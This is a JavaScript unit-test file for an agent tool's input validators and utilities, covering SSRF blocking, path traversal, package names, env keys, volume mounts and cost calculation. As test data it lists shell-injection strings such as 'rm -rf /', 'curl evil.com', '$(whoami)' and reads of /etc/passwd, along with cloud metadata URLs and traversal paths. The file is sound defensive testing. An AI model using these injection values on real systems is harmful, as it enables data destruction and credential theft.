import { describe, it, expect } from 'vitest';
import {
    splitMessage,
    isPathWithinBase,
    validateBrowserUrl,
    isValidPackageName,
    estimateTokenCount,
    getModelPricing,
    calculateCost,
    computeRecommendedTier,
    isVolumeMountAllowed,
    isValidEnvKey,
} from '../src/utils.js';

// ============================
// MESSAGE SPLITTING
// ============================
describe('splitMessage', () => {
    it('returns single chunk for short messages', () => {
        const result = splitMessage('Hello world');
        expect(result).toEqual(['Hello world']);
    });

    it('returns single chunk at exactly max length', () => {
        const msg = 'a'.repeat(1900);
        const result = splitMessage(msg);
        expect(result).toHaveLength(1);
    });

    it('splits at newline when possible', () => {
        const line1 = 'a'.repeat(1000);
        const line2 = 'b'.repeat(1000);
        const msg = `${line1}\n${line2}`;
        const result = splitMessage(msg, 1500);
        expect(result).toHaveLength(2);
        expect(result[0]).toBe(line1);
        expect(result[1]).toBe(line2);
    });

    it('splits at space when no newline available', () => {
        const msg = 'word '.repeat(500); // 2500 chars
        const result = splitMessage(msg, 1900);
        expect(result.length).toBeGreaterThan(1);
        result.forEach(chunk => {
            expect(chunk.length).toBeLessThanOrEqual(1900);
        });
    });

    it('hard cuts when no spaces or newlines', () => {
        const msg = 'x'.repeat(5000); // no spaces or newlines
        const result = splitMessage(msg, 1900);
        expect(result.length).toBe(3); // 1900 + 1900 + 1200
        expect(result[0].length).toBe(1900);
    });

    it('handles empty string', () => {
        const result = splitMessage('');
        expect(result).toEqual(['']);
    });

    it('preserves all content — no data loss', () => {
        const original = 'Hello world\nThis is a test\nThird line\nFourth line';
        const chunks = splitMessage(original, 30);
        const reassembled = chunks.join('\n');
        // Every word from original should appear in reassembled
        for (const word of original.split(/\s+/)) {
            expect(reassembled).toContain(word);
        }
    });
});

// ============================
// PATH TRAVERSAL PREVENTION
// ============================
describe('isPathWithinBase', () => {
    it('allows simple filenames', () => {
        expect(isPathWithinBase('screenshot.png', '/sandbox')).toBe(true);
    });

    it('allows subdirectory paths', () => {
        expect(isPathWithinBase('uploads/photo.jpg', '/sandbox')).toBe(true);
    });

    it('blocks path traversal with ../', () => {
        expect(isPathWithinBase('../etc/passwd', '/sandbox')).toBe(false);
    });

    it('blocks deeply nested traversal', () => {
        expect(isPathWithinBase('../../../../../../etc/shadow', '/sandbox')).toBe(false);
    });

    it('blocks traversal disguised with subdirectory', () => {
        expect(isPathWithinBase('uploads/../../etc/passwd', '/sandbox')).toBe(false);
    });

    it('allows the base path itself', () => {
        expect(isPathWithinBase('.', '/sandbox')).toBe(true);
    });
});

// ============================
// URL VALIDATION (SSRF PREVENTION)
// ============================
describe('validateBrowserUrl', () => {
    it('allows normal http URLs', () => {
        expect(validateBrowserUrl('http://example.com')).toBeNull();
    });

    it('allows normal https URLs', () => {
        expect(validateBrowserUrl('https://www.google.com/search?q=test')).toBeNull();
    });

    it('blocks file:// URLs', () => {
        expect(validateBrowserUrl('file:///etc/passwd')).not.toBeNull();
    });

    it('blocks ftp:// URLs', () => {
        expect(validateBrowserUrl('ftp://server.com/file')).not.toBeNull();
    });

    it('blocks javascript: URLs', () => {
        expect(validateBrowserUrl('javascript:alert(1)')).not.toBeNull();
    });

    it('blocks localhost', () => {
        expect(validateBrowserUrl('http://localhost:11434/api/tags')).not.toBeNull();
    });

    it('blocks 127.0.0.1', () => {
        expect(validateBrowserUrl('http://127.0.0.1:8080')).not.toBeNull();
    });

    it('blocks AWS metadata endpoint', () => {
        expect(validateBrowserUrl('http://169.254.169.254/latest/meta-data/')).not.toBeNull();
    });

    it('blocks private network 10.x', () => {
        expect(validateBrowserUrl('http://10.0.0.1/admin')).not.toBeNull();
    });

    it('blocks private network 192.168.x', () => {
        expect(validateBrowserUrl('http://192.168.1.1/router')).not.toBeNull();
    });

    it('blocks private network 172.16-31.x', () => {
        expect(validateBrowserUrl('http://172.17.0.1/docker')).not.toBeNull();
    });

    it('blocks 0.0.0.0', () => {
        expect(validateBrowserUrl('http://0.0.0.0:3000')).not.toBeNull();
    });

    it('allows external IPs that look similar to private ranges', () => {
        // 172.32.x.x is NOT private — only 172.16-31 is
        expect(validateBrowserUrl('http://172.32.1.1')).toBeNull();
    });
});

// ============================
// PACKAGE NAME VALIDATION
// ============================
describe('isValidPackageName', () => {
    it('allows simple package names', () => {
        expect(isValidPackageName('numpy')).toBe(true);
        expect(isValidPackageName('pandas')).toBe(true);
        expect(isValidPackageName('scikit-learn')).toBe(true);
    });

    it('allows version specifiers', () => {
        expect(isValidPackageName('numpy>=1.21')).toBe(true);
        expect(isValidPackageName('pandas==2.0')).toBe(true);
        expect(isValidPackageName('flask~=2.0')).toBe(true);
    });

    it('allows dots and underscores', () => {
        expect(isValidPackageName('python.dotenv')).toBe(true);
        expect(isValidPackageName('my_package')).toBe(true);
    });

    it('blocks shell injection attempts', () => {
        expect(isValidPackageName('numpy; rm -rf /')).toBe(false);
        expect(isValidPackageName('pandas && curl evil.com')).toBe(false);
        expect(isValidPackageName('$(whoami)')).toBe(false);
        expect(isValidPackageName('`cat /etc/passwd`')).toBe(false);
    });

    it('blocks URLs as package names', () => {
        expect(isValidPackageName('http://evil.com/malware.tar.gz')).toBe(false);
    });

    it('blocks pipes and redirects', () => {
        expect(isValidPackageName('numpy | tee /tmp/out')).toBe(false);
        expect(isValidPackageName('pandas > /etc/crontab')).toBe(false);
    });

    it('blocks empty strings', () => {
        expect(isValidPackageName('')).toBe(false);
    });

    it('blocks names starting with special chars', () => {
        expect(isValidPackageName('-numpy')).toBe(false);
        expect(isValidPackageName('.hidden')).toBe(false);
    });
});

// ============================
// TOKEN ESTIMATION
// ============================
describe('estimateTokenCount', () => {
    it('estimates roughly 4 chars per token', () => {
        expect(estimateTokenCount('Hello world!')).toBe(3); // 12 chars / 4
    });

    it('handles empty string', () => {
        expect(estimateTokenCount('')).toBe(0);
    });

    it('rounds up', () => {
        expect(estimateTokenCount('Hi')).toBe(1); // 2 chars → ceil(0.5) = 1
    });

    it('handles long text', () => {
        const text = 'a'.repeat(4000);
        expect(estimateTokenCount(text)).toBe(1000);
    });
});

// ============================
// COST CALCULATION
// ============================
describe('getModelPricing', () => {
    it('returns exact pricing for known models', () => {
        expect(getModelPricing('claude-haiku-4-5')).toEqual({ input: 1.00, output: 5.00 });
        expect(getModelPricing('gpt-4o')).toEqual({ input: 2.50, output: 10.00 });
        expect(getModelPricing('gemini-2.5-flash')).toEqual({ input: 0.15, output: 0.60 });
    });

    it('returns zero for local models', () => {
        expect(getModelPricing('llama3.1:8b')).toEqual({ input: 0, output: 0 });
    });

    it('infers pricing from family name', () => {
        const opusPricing = getModelPricing('claude-opus-99-some-future-version');
        expect(opusPricing.input).toBe(5.00);

        const haikuPricing = getModelPricing('some-new-haiku-model');
        expect(haikuPricing.input).toBe(1.00);
    });

    it('returns default pricing for completely unknown models', () => {
        expect(getModelPricing('totally-unknown-model-xyz')).toEqual({ input: 3.00, output: 15.00 });
    });

    it('recognizes Ollama models as free', () => {
        expect(getModelPricing('llama3.2:latest').input).toBe(0);
        expect(getModelPricing('mistral:7b-instruct').input).toBe(0);
    });
});

describe('calculateCost', () => {
    it('calculates Haiku cost correctly', () => {
        // 1000 input tokens + 500 output tokens on Haiku ($1/$5 per MTok)
        const cost = calculateCost('claude-haiku-4-5', 1000, 500);
        expect(cost).toBeCloseTo(0.001 + 0.0025, 5); // $0.0035
    });

    it('calculates zero for Ollama', () => {
        const cost = calculateCost('llama3.1:8b', 10000, 5000);
        expect(cost).toBe(0);
    });

    it('calculates GPT-4o cost correctly', () => {
        // 1M input + 1M output on GPT-4o ($2.50/$10)
        const cost = calculateCost('gpt-4o', 1_000_000, 1_000_000);
        expect(cost).toBeCloseTo(12.50, 2);
    });

    it('handles zero tokens', () => {
        expect(calculateCost('claude-sonnet-4-5', 0, 0)).toBe(0);
    });
});

// ============================
// SKILL TIER RECOMMENDATIONS
// ============================
describe('computeRecommendedTier', () => {
    it('recommends local for zero-tool tasks', () => {
        expect(computeRecommendedTier(0, 0, 1.0, 0, 0)).toBe('local');
    });

    it('recommends local for low-tool, high-success tasks', () => {
        expect(computeRecommendedTier(1.5, 2, 0.9, 5, 0)).toBe('local');
    });

    it('recommends heartbeat when local model keeps failing', () => {
        expect(computeRecommendedTier(1.0, 2, 0.5, 1, 4)).toBe('heartbeat');
    });

    it('recommends light for high-tool-count tasks', () => {
        expect(computeRecommendedTier(4.0, 6, 0.9, 0, 0)).toBe('light');
    });

    it('recommends heartbeat for moderate tasks', () => {
        expect(computeRecommendedTier(2.0, 3, 0.85, 0, 0)).toBe('heartbeat');
    });
});

// ============================
// VOLUME MOUNT VALIDATION
// ============================
describe('isVolumeMountAllowed', () => {
    const allowed = ['/home/ubuntu/gravityclaw/data/sandbox', '/home/ubuntu/gravityclaw-vault'];

    it('allows sandbox mounts', () => {
        expect(isVolumeMountAllowed('/home/ubuntu/gravityclaw/data/sandbox:/sandbox', allowed)).toBe(true);
    });

    it('allows vault mounts', () => {
        expect(isVolumeMountAllowed('/home/ubuntu/gravityclaw-vault:/obsidian', allowed)).toBe(true);
    });

    it('blocks root filesystem', () => {
        expect(isVolumeMountAllowed('/:/host', allowed)).toBe(false);
    });

    it('blocks /etc', () => {
        expect(isVolumeMountAllowed('/etc:/etc', allowed)).toBe(false);
    });

    it('blocks home directory', () => {
        expect(isVolumeMountAllowed('/home/ubuntu:/home', allowed)).toBe(false);
    });

    it('blocks .env file specifically', () => {
        expect(isVolumeMountAllowed('/home/ubuntu/gravityclaw/.env:/secrets', allowed)).toBe(false);
    });

    it('handles read-only suffix', () => {
        expect(isVolumeMountAllowed('/home/ubuntu/gravityclaw/data/sandbox:/sandbox:ro', allowed)).toBe(true);
    });

    it('blocks traversal in volume path', () => {
        expect(isVolumeMountAllowed('/home/ubuntu/gravityclaw/data/sandbox/../../.env:/secrets', allowed)).toBe(false);
    });
});

// ============================
// ENV KEY VALIDATION
// ============================
describe('isValidEnvKey', () => {
    it('allows standard env variable names', () => {
        expect(isValidEnvKey('API_KEY')).toBe(true);
        expect(isValidEnvKey('TWITTER_API_SECRET')).toBe(true);
        expect(isValidEnvKey('HOME')).toBe(true);
    });

    it('allows underscore-prefixed names', () => {
        expect(isValidEnvKey('_INTERNAL')).toBe(true);
    });

    it('blocks names with spaces', () => {
        expect(isValidEnvKey('MY KEY')).toBe(false);
    });

    it('blocks names with special characters', () => {
        expect(isValidEnvKey('KEY;rm -rf /')).toBe(false);
        expect(isValidEnvKey('KEY=$(whoami)')).toBe(false);
        expect(isValidEnvKey('KEY`id`')).toBe(false);
    });

    it('blocks names starting with numbers', () => {
        expect(isValidEnvKey('123KEY')).toBe(false);
    });

    it('blocks empty string', () => {
        expect(isValidEnvKey('')).toBe(false);
    });

    it('blocks hyphenated names', () => {
        expect(isValidEnvKey('MY-KEY')).toBe(false);
    });
});
